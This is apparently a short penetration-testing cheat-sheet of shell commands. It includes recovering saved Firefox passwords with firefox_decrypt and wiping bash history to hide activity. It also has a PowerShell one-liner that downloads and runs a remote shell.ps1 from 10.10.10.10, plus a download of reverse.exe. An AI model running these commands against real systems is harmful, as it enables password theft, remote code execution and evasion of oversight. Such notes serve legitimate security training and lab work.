## Tmux Tutorial
- [https://leimao.github.io/blog/Tmux-Tutorial/](https://leimao.github.io/blog/Tmux-Tutorial/)
## Decrypting Firefox
Make sure the following files are available
- `cert9.db`
- `key4.db`
- `cookies.sqlite`
- `logins.json`
Use tool [firefox_decrypt](https://github.com/unode/firefox_decrypt) to crack the username and password combination
```nix
python3 firefox_decrypt firefox-profile/
```
## Clearing Bash History
```nix
cat /dev/null > ~/.bash_history && history -c && exit
```
## Create HTTP server with Python
```nix
# Python 2
python -m SimpleHTTPServer 8000

# Python 3
python3 -m http.server 8000
```
## Download file using Base64 trick
Convert the file content into Base64 and save it
```nix
cat file.jpg | base64 > file.b64
```
Decode the Base64 content and save it into a proper file
```nix
cat file.b64 | base64 --decode > file.jpg
```
## Mounting a `/dev` directory to `/mnt`
```nix
sudo mount /dev/suspicious_disk /mnt/amogus
```
## Check a binary's content
```nix
strings binary
```
## Download file on machine
Linux
```nix
wget 10.10.10.10/file -O /tmp/file
```
Windows
```powershell
Invoke-WebRequest -uri 10.10.10.10/file.exe -outfile C:\\\\Windows\\temp\\file.exe
```
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('<http://10.10.10.10/shell.ps1>');
```
```powershell
powershell -c wget "<http://10.10.10.10/reverse.exe>" -outfile "reverse.exe"
```
## Using xFreeRDP to access Window Machines
```nix
xfreerdp +clipboard /u:username /p:password /v:10.10.10.10 /size:1280x760
```